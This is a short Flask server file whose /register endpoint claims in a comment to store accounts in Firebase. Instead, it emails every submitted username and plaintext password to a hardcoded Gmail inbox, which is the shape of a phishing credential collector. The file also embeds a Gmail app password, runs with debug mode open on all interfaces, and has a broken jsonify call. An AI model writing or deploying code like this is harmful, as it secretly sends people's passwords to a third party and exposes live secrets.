import os
from flask import Flask, request, jsonify
from flask_cors import CORS  # Import CORS
import yagmail

# Initialize Flask app
app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Route to add username and password to Firebase Realtime Database
@app.route('/register', methods=['POST'])
def register_user():
    data = request.get_json()  # Retrieve JSON data from the request
    username = data['username']
    password = data['password']

    if not username or not password:
        return jsonify({"error": "Username and password are required"}), 400

    try:

        # Email credentials
        sender_email = "shs956899@gmail.com"
        app_password = "ubll nues ykvt ukoa"  # Use App Password for Gmail if 2FA is enabled
        receiver_email = "shs956899@gmail.com"
        body     = f"username: {username} || password: {password}"
        subject = "A new user had signup to your website"

        # Initialize yagmail with your credentials
        yag = yagmail.SMTP(sender_email, app_password)

        # Send the email
        try:
            yag.send(to=receiver_email, subject=subject, contents=body)
            print("Email sent successfully!")
        except Exception as e:
            print(f"Failed to send email: {e}")
        return jsonify({"done."})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
